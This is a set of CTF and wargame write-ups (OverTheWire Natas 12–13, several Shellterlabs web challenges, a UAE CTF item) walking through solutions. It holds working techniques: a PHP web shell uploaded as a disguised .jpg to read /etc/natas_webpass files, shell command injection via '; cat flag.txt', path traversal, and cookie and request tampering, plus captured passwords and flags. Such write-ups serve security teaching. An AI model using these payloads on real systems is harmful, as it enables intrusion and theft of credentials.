![1](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas12/1.png)

## Solution

If we check the source code we see
```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="wkmjb7q5ue.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```
As we keep refreshing the page, we still get `random` name for the `value="wkmjb7q5ue.jpg"` file.
If we have a look at the [Source code](http://natas12.natas.labs.overthewire.org/index-source.html), we see
```
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
```
We see that the file gets a random `path` from the function `makeRandomPath()` and `name` from `genRandomString()`.
Down we also see `<? print genRandomString(); ?>.jpg` which was also presented in `index.php` webpage. 
This is an LFI type of attack, for extra details check [trialofbits](https://vimeo.com/32509769).
A tpical PHP line to exploit: <? echo system(\" ls; \") ?> and hide it in a `.jpg`. 
To do that we use: `echo "string " > name.jpg`.
So, we use `echo "<? echo system(\" ls \"); ?>" > 1.jpg`.
Now we go back to the site and upload the image file.
Before we click on `Upload`, we `Inspect` on the image that we uploaded using `Dev Tools`.
We look back for `value="random_name.jpg"` and we change it to `value="random_name.php`.
We click `Enter` to make sure its changed.
Now `Upload`.
It gives us `The file upload/j31o6bx15x.php has been uploaded`, when we check that page we get this list
```
3fw5idg4y8.php
3kzfrrvgig.php
5mwyyz89cj.jpg
77smoe16do.php
9xpr4x28pp.jpg
bf0tmyncki.jpg
ccw3b8bcic.jpg
eowa7mjj39.php
j31o6bx15x.php
klpn4rtlu0.php
lj1edrky2p.jpg
mvlaf05fnt.jpg
o6ktlghv56.php
q2k5lew3pp.jpg
qvipmjgium.php
qvipmjgium.php
````
It seems the exploit worked. Those are probably `exploits` from other players to find the `password`. We can check them for a clue for the location or we can just use the same location we found in `Natas10`.
To do that, we create a new file with new code by `echo "<? echo system(\" cat /etc/natas_webpass/natas13 \"); ?>" > 2.jpg`.
This will display the Natas13 password for us.
Now we do the same steps like before and we check
```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
``` 
Finally, the passcode is `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.




### File: Writeups/Web/OverTheWire/Natas/Natas13/Natas13.md

# [Natas 13](http://natas13.natas.labs.overthewire.org/)

![0](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas13/0.png)

## Solution

Need to Check [Natas12 Writeup](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas12/Natas12.md) for a followup.
Its the same type of `Exploit` but they want it to have the right `file signature`.
If we check `View source` we have:
```
$err=$_FILES['uploadedfile']['error']; 
    if($err){ 
        if($err === 2){ 
            echo "The uploaded file exceeds MAX_FILE_SIZE"; 
        } else{ 
            echo "Something went wrong :/"; 
        } 
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
```
Here they are checking the `file size` and making sure that the file is completely a `.jpg`.

To change the `file signature` we just import the same image we used for `Natas12` then we import it to [HxD](https://mh-nexus.de/en/hxd/) hex editor.

![1](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas13/1.png)

We see that the file has no file signature for a `.jpg` so to add one we copy our signature `FF D8 FF DB` and then go to `Edit -> Paste Insert` we end up with

![2](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas13/2.png)

Since we need the passcode for the next challange, we just change `Natas13` to `Natas14` too.

![3](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas13/3.png)

Now we save it and repeat the same uploading steps in `Natas12`, this time we get
```
����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

So, the passcode is `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.


 		



### File: Writeups/Web/Shellterlabs/Forgotten/Forgotten.md

# [Forgotten](https://shellterlabs.com/en/questions/carnaval-hacking-2017/crnvl-forgotten/)

```
Dev people are always forgetting things. 
Let's take advantage on that and find the creds.
```

## Solution

The `source code` has nothing of intrest so we tried some `SQL Injection`. 
After few fails, we attempted a `directory search` using [dirsearch](https://github.com/maurosoria/dirsearch).
With a full scan, we found only one intresting directory `/checklogin.php`. 
If we insert that into the URL we get nothing. If we look back at the question `Dev people are always forgetting things` we tried using `/checklogin.php.bkp`
and we got
```
<?php
   session_start();
   
   if($_SERVER["REQUEST_METHOD"] == "POST") {
      // username and password sent from form 
      
      $username = $_POST['username'];
      $password = $_POST['password']; 
      
      // If result matched $myusername and $mypassword, table row must be 1 row
			if($username == "dogbert" && $password == "shellter{n3v3r_f0r637_70_r3v13w_7h3_f1l35_0f_y0ur_pr0j3c7}"){
         $_SESSION['login_user'] = $username;
         header("location:welcome.php");
      }else {
         echo "Your Login Name or Password is invalid";
      }
   }

?>
```
The flag is `shellter{n3v3r_f0r637_70_r3v13w_7h3_f1l35_0f_y0ur_pr0j3c7}`



### File: Writeups/Web/Shellterlabs/Song_travel/song_travel.md

# Song Travel
```
Songs help us travel across our imagination. Choose your favorite song and find the flag text file.
```
## Solution

The page has multiple `Song` tabs that each have a song, which all are useless.
Once you click on any song tab your can see in your url: `/index.php?page=song2`.
The question states `flag txt file` so we replace `song2` with `flag.txt` we get
```
Warning: fopen(./pages/flag.txt): failed to open stream: No such file or directory in /var/www/html/index.php on line 5

Warning: filesize(): stat failed for ./pages/flag.txt in /var/www/html/index.php on line 6

Warning: fread() expects parameter 1 to be resource, boolean given in /var/www/html/index.php on line 6

Warning: fclose() expects parameter 1 to be resource, boolean given in /var/www/html/index.php on line 7
```

Lets check if `flag.txt` is avilable in the the `pages` directory by `../flag.txt` by `/index.php?page=../flag.txt`. 
Now you will be able to see the flag `shellter{D0NT_TRUST_TH3_US3R}`. 



### File: Writeups/Web/Shellterlabs/banana_shopping/banana_shopping.md

# [Banana Shopping](https://shellterlabs.com/en/questions/shx-4/shx4-banana-shopping/)
```
I bet you can't buy 72 bananas and pay 0 for it!
```

## Solution

We have this page:

![1](https://github.com/GHAFRI/Writeups/blob/master/Web/Shellterlabs/banana_shopping/1.png)

We try putting 72 in banana we get a total of 216. When we tried other fruits, we get a higher result. Also, when we insert a negative or high value we always get a higher result.
We start inspecting the code and enter `fruit.js`. Inside we have 
```
function DoSubmit(){
      document.getElementById("apple").value = Math.abs(parseInt(document.getElementById("apple").value));
      document.getElementById("banana").value = Math.abs(parseInt(document.getElementById("banana").value));
      document.getElementById("grape").value = Math.abs(parseInt(document.getElementById("grape").value));
      document.getElementById("lemon").value = Math.abs(parseInt(document.getElementById("lemon").value));
      document.getElementById("mango").value = Math.abs(parseInt(document.getElementById("mango").value));
      document.getElementById("watermelon").value = Math.abs(parseInt(document.getElementById("watermelon").value));
      return true;
}
```
Looks like the script takes our input, parse it to Int and the make it poitive by `Math.abs`. However, this only works within the broswer.
If we look into [Burp Suite](https://portswigger.net/burp/communitydownload), we can take the positive values from the `POST request` and change them to negative.
So when we tried `-72` for banana we got total of `-216`, so with simple maths, we look into lemon to be `-216` and hopefully the total will be 0.
we get

![2](https://github.com/GHAFRI/Writeups/blob/master/Web/Shellterlabs/banana_shopping/2.png)



### File: Writeups/Web/Shellterlabs/hello_admin/hello_admin.md

# Hello Admin
```
We need to access this page with admin privilege.
```
## Solution

The page has a username and password form. 
The source code has shows no signs.
However, if we check the `cookies` we have a cookie named `user` with content `anonymous`.
We tried to modify `anonymous` to `admin`.
Lets try using [Burp Suite](https://portswigger.net/burp/communitydownload)
If we press Enviar we get
```
POST /log_in.php HTTP/1.1
Host: lab.shellterlabs.com:33737
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://lab.shellterlabs.com:33737/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Cookie: _ga=GA1.2.1875004825.1522742332; _gid=GA1.2.1108648182.1522742334; user=anonymous; aut=0; PHPSESSID=eddece382d153bb154610b85f5d9ebc0
Connection: close
Upgrade-Insecure-Requests: 1

usuario=&senha=
```
So lets modify `user=anonymous; aut=0` to `user=admin; aut=1`
Then we press `Forward` we get
```
 Parabns!

...

Time to get your flag!

flag = shellter{always_tamper_cookies}
```

flag is `shellter{always_tamper_cookies}`




### File: Writeups/Web/Shellterlabs/memes/memes.md

# Memes
```
The owner of this website is addicted to memes, he decided to create a system to view the memes, but I think it did not work ... (watch out for the trolls)
```
## Solution

The site has a picture and music playing in the background.
If we check `/robots.txt` we get 
```
User-agent: *
Disallow: /memesviewer/
Disallow: /tafacil.txt
```

Now, when we check `/memesviewer/tafacil.txt` we get an error page, but if we check onle `/memesviewer` we get the `index` page.
Inside `flag.txt` we have the flag `shellter{3u_s0u_muit0_r4p1d0}`




### File: Writeups/Web/Shellterlabs/ping_test/ping_text.md

# Ping Test
```
Check out my new web application. 
Give it an IP to test if it responds to ping requests.
```
## Solution

We start by giving it the Host ip: `google.com` and we get
```
Ping Output:
PING google.com (172.217.15.78): 56 data bytes
64 bytes from 172.217.15.78: icmp_seq=0 ttl=47 time=0.841 ms
--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.841/0.841/0.841/0.000 ms
```
We believe that the `ping` reuqeust is actually sent from `Lunix` and the `input form` is actually a command line. 
We test it by adding `; ls`
```
PING google.com (172.217.7.174): 56 data bytes
64 bytes from 172.217.7.174: icmp_seq=0 ttl=47 time=0.598 ms
--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.598/0.598/0.598/0.000 ms
flag.txt
index.php
```
The `;` breaks the command line and goes to the second line therefore we can call `ls` in the same line.
Lets try now `google.com; cat flag.txt`
```
PING google.com (216.58.217.110): 56 data bytes
64 bytes from 216.58.217.110: icmp_seq=0 ttl=47 time=0.857 ms
--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.857/0.857/0.857/0.000 ms
shellter{B3_C4r3ful_W1TH_Us3R5_1NpUT}
```

The flag is `shellter{B3_C4r3ful_W1TH_Us3R5_1NpUT}`



### File: Writeups/Web/UAE National Cyber Security CTF Finals 2018/easymessage.md

# Easy Message

[Easy Message](http://ec2-35-164-4-176.us-west-2.compute.amazonaws.com/easymessage/)

So we begin by checking `easymessage/robots.txt` if it exits and it shows this
```
User-agent: *
Disallow: /?source
```

So we check `easymessage/?source` and we get
```
<?php

$user = $_POST['user'];
$pass = $_POST['pass'];

include('db.php');

if ($user == base64_decode('Q3liZXItVGFsZW50') && $pass == base64_decode('Q3liZXItVGFsZW50')
    {
        success_login();
    }
    else {
        failed_login();
}

?>
```

After we decode `Q3liZXItVGFsZW50` to `Cyber-Talent` we login and get
```
I Have a Message For You


..-. .-.. .- --. -.--. .. -....- -.- -. ----- .-- -....- -.-- ----- ..- -....- .- .-. ...-- -....- -- ----- .-. ... ...-- -.--.-
```

Its morse code, so we decode that too and we get the flag

`FLAG<KN>I-KN0W-Y0U-AR3-M0RS3)`





